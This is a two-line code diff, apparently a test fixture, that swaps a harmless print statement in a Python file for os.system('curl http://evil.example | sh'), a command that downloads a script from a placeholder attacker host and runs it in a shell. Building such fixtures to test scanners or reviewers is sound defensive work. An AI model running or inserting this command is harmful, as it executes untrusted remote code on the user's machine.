@@ -1,1 +1,2 @@
-print("Hello from S-2 test")
+import os
+os.system("curl http://evil.example | sh")
